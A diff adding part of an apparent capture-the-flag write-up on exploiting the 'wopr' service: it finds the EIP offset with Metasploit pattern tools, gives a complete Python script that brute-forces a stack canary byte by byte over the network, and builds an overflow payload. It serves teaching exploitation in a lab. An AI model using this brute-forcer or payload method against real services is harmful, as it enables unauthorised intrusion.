@@ -97,3 +97,137 @@ If we send a long request of 1000 using the following commands **python -c 'prin
 ![wopr-nc-2.png](/assets/img/wopr/wopr-nc-2.png)
 
 Going back to the window that is running wopr, we can see that the request is triggering SSP and we are overwriting EIP with A's – we can use the presence of “bye” to determine if the canary is correct:
+![wopr-eip.png](/assets/img/wopr/wopr-eip.png)
+
+Before we get to writing a PoC to brute force the stack canaries, let's work out the offset of
+EIP using msfpayload on our kali box using ***ruby /usr/share/metasploitframework/tools/pattern_create.rb 1000***
+wopr-pattern1
+![wopr-pattern1.png](/assets/img/wopr/wopr-pattern1.png)
+
+If we go back to our ssh session on persistence and copy the output from msfpayload into a
+file called find-eip and then pipe it to wopr using ***nc 127.0.0.1 1337 < find-eip***
+![wopr-eip2.png](/assets/img/wopr/wopr-eip2.png)
+
+We can see where the offset is on the SSP error:
+![wopr-ssp.png](/assets/img/wopr/wopr-ssp.png)
+
+Now we can enter this address into pattern_offset using ***ruby /usr/share/metasploitframework/tools/pattern_offset.rb 0x33624132***, we see that EIP's offset is 38.
+![wopr-pattern-offset.png](/assets/img/wopr/wopr-pattern-offset.png)
+
+Armed with this information we can write our code to brute force the canary. I present to
+you get_canary.py
+
+```python
+#!/usr/bin/env python
+import socket, time, sys
+
+#declare globals
+global target
+global port
+global eipoffset
+global canarysize
+canaryOffset = 0
+canaryValue = ""
+
+#this function sends a request to the wopr service (crudely) and receives the response
+def sendRequest(target, port, payload):
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	try:
+				s.connect((target, port))
+				done = False
+				while done == False:
+					response=s.recv(1024)
+					if ">" in response:
+						s.send(payload)
+						result = ""
+						result =  s.recv(1024)
+						result = result.strip() +  s.recv(1024)
+						result = result.strip()
+						return result
+	except Exception, err:
+				print Exception, err
+
+#find canary offset by trying one A at a time until we hit the stack smash protection
+def getCanaryOffset():
+	for i in range(1,eipoffset):
+			payload = "A"*i
+			result = sendRequest(target,port,payload)
+			if "bye" not in result:
+				#we remove one from the result because the integer
+				#is the first time hit the SSP
+				offset=i-1 
+				print "[+] Canary found at offset: " + str(offset)
+				return offset
+	
+				
+def bruteForceCanary(offset, length):
+	canary = "" 
+	#use the specified canary length  
+	for byte in xrange(length):
+		#try this many bytes for the canary
+		#this code just generates the bytes 0-255 and converts them to characters
+		for canary_byte in xrange(256):
+			hex_byte = chr(canary_byte)
+			#build up the payload using our predicted offset and brute force
+			#the canary one byte at a time
+			payload="A"*offset + canary + hex_byte
+			result = sendRequest(target,port,payload)
+			#if the canary byte was correct then "bye" is returned in the response
+			if "bye" in result:
+				canary += hex_byte
+				break
+	return canary
+
+
+if len(sys.argv) < 4:
+	print "[-] usage: python get_canary.py [ip] [port] [eip-offset] [canary-size]"
+	exit(0)
+else:
+	target = sys.argv[1]
+	port = int(sys.argv[2])
+	eipoffset = int(sys.argv[3])
+	canarysize = int(sys.argv[4])
+	
+	canaryOffset = getCanaryOffset()
+	payload = bruteForceCanary(canaryOffset,canarysize)
+	print "[+] Saving payload to payload.txt"
+	fp = open("payload.txt", "w")
+	fp.write("A"*canaryOffset + payload)
+	fp.close()
+```
+
+If we give it a whirl we see the following:
+![wopr-run-get_canary.png](/assets/img/wopr/wopr-run-get_canary.png)
+
+We are writing 30 A's followed by the canary value to payload.txt so we can use it in our
+testing:
+![wopr-cat-payload.png](/assets/img/wopr/wopr-cat-payload.png)
+
+Going back to our original concept that on the stack we have
+```[Local Variables][Stack Canary][EBP][EIP]```
+If we add BBBBCCCC to the end of payload.txt we should overwrite EBP with BBBB
+(42424242) and EIP with CCCC (43434343) we can do this with the following command:
+***echo -n $(cat payload.txt)BBBBCCCC > new-payload.txt***
+
+It uses substitution to read payload.txt and echo (-n is for no new line characters) it out
+along with BBBBCCCC back to payload.txt:
+![wopr-cat-payload2.png](/assets/img/wopr/wopr-cat-payload2.png)
+
+For the remainder of our debugging adventures we will use the following two commands:
+```
+set follow-fork-mode child
+set detach-on-fork off
+```
+
+These commands help us debug the child processes that are spawned as this is where our
+crash will occur, lets attach to the process as we did before and enter the commands we will
+also enter c to allow the application to continue this is because when we attach a debugger
+to an application it will put it into a paused state:
+![wopr-follow2.png](/assets/img/wopr/wopr-follow2.png)
+
+We now send our payload as before:
+![wopr-new-payload2.png](/assets/img/wopr/wopr-new-payload2.png)
+
+In the wopr window we see that there is no SSP error just a “got a connection message” –
+the canary has been pwned.
+
